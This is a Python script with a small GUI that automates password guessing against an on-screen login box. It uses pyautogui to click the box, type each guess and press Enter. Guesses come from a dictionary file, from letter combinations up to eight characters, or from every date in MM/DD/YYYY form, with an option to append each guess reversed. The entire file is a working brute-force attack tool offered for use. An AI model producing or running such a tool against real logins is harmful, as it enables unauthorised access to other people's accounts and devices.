import pyautogui
import itertools
import threading
import tkinter as tk
from tkinter import filedialog
from pynput import keyboard

# Global variables
running = True
use_dictionary = False
use_flip = False
dictionary_words = []
current_index = 0
pyautogui.FAILSAFE = True
pyautogui.PAUSE = 0.05

current_year = 0
current_month = 1
current_day = 1

def flip_and_append(word):
    return word + word[::-1]

def brute_force_password(max_length, login_box_position):
    global running, use_dictionary, dictionary_words, current_index
    while running:
        if use_flip == True:
            if use_dictionary:
                if current_index >= len(dictionary_words):
                    running = False
                    return
                word = dictionary_words[current_index]
                attempt = flip_and_append(word.strip())
                pyautogui.click(login_box_position)
                pyautogui.typewrite(attempt)
                pyautogui.press('enter')
                pyautogui.hotkey('ctrl', 'a')
                pyautogui.press('backspace')
                current_index += 1
            else:
                charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
                for length in range(1, max_length + 1):
                    for combination in itertools.product(charset, repeat=length):
                        if not running:
                            return
                        attempt = flip_and_append(''.join(combination))
                        pyautogui.click(login_box_position)
                        pyautogui.typewrite(attempt)
                        pyautogui.press('enter')
                        pyautogui.hotkey('ctrl', 'a')
                        pyautogui.press('backspace')
        else:
            if use_dictionary:
                if current_index >= len(dictionary_words):
                    running = False
                    return
                word = dictionary_words[current_index]
                attempt = word
                pyautogui.click(login_box_position)
                pyautogui.typewrite(attempt)
                pyautogui.press('enter')
                pyautogui.hotkey('ctrl', 'a')
                pyautogui.press('backspace')
                current_index += 1
            else:
                charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
                for length in range(1, max_length + 1):
                    for combination in itertools.product(charset, repeat=length):
                        if not running:
                            return
                        attempt = (''.join(combination))
                        pyautogui.click(login_box_position)
                        pyautogui.typewrite(attempt)
                        pyautogui.press('enter')
                        pyautogui.hotkey('ctrl', 'a')
                        pyautogui.press('backspace')

def brute_force_dates(login_box_position):
    global running, current_year, current_month, current_day
    while running:
        # Format date
        date_str = f"{current_month:02d}/{current_day:02d}/{current_year}"
        pyautogui.click(login_box_position)
        pyautogui.typewrite(date_str)
        pyautogui.press('enter')
        pyautogui.hotkey('ctrl', 'a')
        pyautogui.press('backspace')

        # Increment date
        if current_year == 2024 and current_month == 12 and current_day == 31:
            running = False
            return

        current_day += 1

        # For reference, 4, 6, 9, and 11 have 30 days, and 2 has 28/29
        # All the rest have 31 so they can be ignored in the checks
        # Make sure this code is ordered in descending order (31, then 30, then 28/29 months)
        if current_day > 31: # If the date is the 32nd somehow,
            current_day = 1 # Set the day to 1
            current_month += 1 # Add a month 

        if current_month == 4 or current_month == 6 or current_month == 9 or current_month == 11: # If the month is April, June, September, or November
            if current_day > 30: # If the day is the 31st
                current_day = 1 # Set the day to 1
                current_month += 1 # Add one to the months
 
        if current_month == 2: # If the month is February 
            if current_year % 4 == 0: # If it is a leap year
                if current_day > 29: # If the day is the 30th
                    current_day = 1 # Set the day to 1
                    current_month += 1 # Add one to the months
            else: # If the year is not a leap year
                if current_day > 28: # If the day is the 29th
                    current_day = 1 # Set the day to 1
                    current_month += 1 # Add one to months

        # KEEP THIS check FINAL IN THE LIST
        if current_month > 12: # If the month is past December,
            current_month = 1 # Set the month to 1
            current_year += 1 # Add a year

def on_press(key):
    global running
    try:
        if key == keyboard.Key.esc:
            running = False
    except AttributeError:
        pass

def check_failsafe():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def choose_dictionary_file():
    global dictionary_words
    file_path = filedialog.askopenfilename(title="Select Dictionary File", filetypes=(("Text files", "*.txt"), ("List files", "*.lst"), ("All files", "*.*")))
    if file_path:
        with open(file_path, 'r') as file:
            dictionary_words = file.readlines()
        global use_dictionary, current_index
        use_dictionary = True
        current_index = 0

def enable_flip():
    global use_flip
    use_flip = True

def start_password_brute_force():
    global failsafe_thread
    failsafe_thread = threading.Thread(target=check_failsafe)
    failsafe_thread.start()
    max_length = 8  # Change as needed
    login_box_position = (950, 570)  # Replace with the actual position of the login box on your screen
    brute_force_password(max_length, login_box_position)

def start_date_brute_force():
    global failsafe_thread
    failsafe_thread = threading.Thread(target=check_failsafe)
    failsafe_thread.start()
    login_box_position = (950, 570)  # Replace with the actual position of the login box on your screen
    brute_force_dates(login_box_position)

# Create Tkinter GUI
root = tk.Tk()
root.title("Brute Force")
root.geometry("720x480")
root.configure(padx=10, pady=10)

lbl_info = tk.Label(root, text="Select options:")
lbl_info.pack()

btn_password = tk.Button(root, text="Password Brute Force", command=start_password_brute_force)
btn_password.pack(fill=tk.X, pady=5)

btn_choose_dictionary = tk.Button(root, text="Choose Dictionary File", command=choose_dictionary_file)
btn_choose_dictionary.pack(fill=tk.X, pady=5)

btn_choose_dictionary = tk.Button(root, text="SngollognS-ify (words, charset, AND dates)", command=enable_flip)
btn_choose_dictionary.pack(fill=tk.X, pady=5)

btn_date = tk.Button(root, text="Date Brute Force", command=start_date_brute_force)
btn_date.pack(fill=tk.X, pady=5)

root.mainloop()